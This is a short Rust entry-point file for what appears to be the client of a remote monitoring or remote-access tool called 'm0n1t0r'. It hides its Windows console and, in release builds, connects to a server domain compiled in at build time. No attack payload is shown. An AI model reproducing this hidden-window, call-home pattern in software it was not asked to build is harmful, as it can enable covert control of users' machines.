#![windows_subsystem = "windows"]

use anyhow::Result;
use flexi_logger::Logger;
use m0n1t0r_client::Config;
use std::{collections::HashMap, sync::Arc};
use tokio::sync::RwLock;

const DEFAULT_SERVER_PORT: u16 = 27853;

#[cfg(not(debug_assertions))]
async fn init() -> Result<()> {
    use std::time::Duration;
    use tokio::time;

    if !m0n1t0r_client::init().await? {
        time::sleep(Duration::from_secs(60)).await;
        return Err(m0n1t0r_common::Error::InitializationFailed.into());
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    Logger::try_with_str("info")?.start()?;
    #[cfg(not(debug_assertions))]
    init().await?;

    let client_map = Arc::new(RwLock::new(HashMap::new()));
    #[cfg(debug_assertions)]
    let config = Config::new("127.0.0.1", DEFAULT_SERVER_PORT);
    #[cfg(not(debug_assertions))]
    let config = Config::new(env!("M0N1T0R_DOMAIN"), DEFAULT_SERVER_PORT);

    m0n1t0r_client::run(&config, client_map).await?;
    Ok(())
}
